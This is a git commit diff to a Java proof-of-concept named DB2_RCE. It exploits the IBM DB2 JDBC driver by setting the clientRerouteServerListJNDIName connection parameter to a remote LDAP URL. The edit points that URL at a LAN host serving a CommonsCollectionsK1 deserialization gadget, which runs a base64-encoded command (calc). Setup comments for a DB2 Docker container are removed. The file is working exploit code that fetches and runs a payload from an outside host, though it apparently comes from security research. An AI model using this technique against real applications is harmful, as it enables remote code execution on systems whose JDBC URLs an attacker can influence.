1924e571af1aff78a45ed56341a8470400d24cfa
GG <46676047+EstamelGG@users.noreply.github.com>
2024-07-03 16:32:31 +0800

    update

--- src/main/java/org/example/DB2_RCE.java
+++ src/main/java/org/example/DB2_RCE.java
@@ -3,12 +3,12 @@ package org.example;
 import java.sql.Connection;
 import java.sql.DriverManager;
 
-// Test in MacOS
-// OpenJDK 22
+// Test in Windows
+// Oracle Java 8
 public class DB2_RCE {
     public static void main(String[] args) throws Exception {
         String driver = "com.ibm.db2.jcc.DB2Driver";
-        String Payload_url = "ldap://127.0.0.1:1389/evil";
+        String Payload_url = "ldap://192.168.20.130:1234/Deserialization/CommonsCollectionsK1/Command/Base64/Y2FsYw==";
         String DB_URL = "jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=" + Payload_url + ";";
         System.out.println(DB_URL);
         Class.forName(driver);
@@ -16,6 +16,3 @@ public class DB2_RCE {
         conn.close();
     }
 }
-
-// docker pull ibmoms/db2express-c
-// docker run -itd --name db2 --privileged=true -p 50000:50000 -e DB2INST1_PASSWORD=db2admin -e LICENSE=accept ibmoms/db2express-c db2start
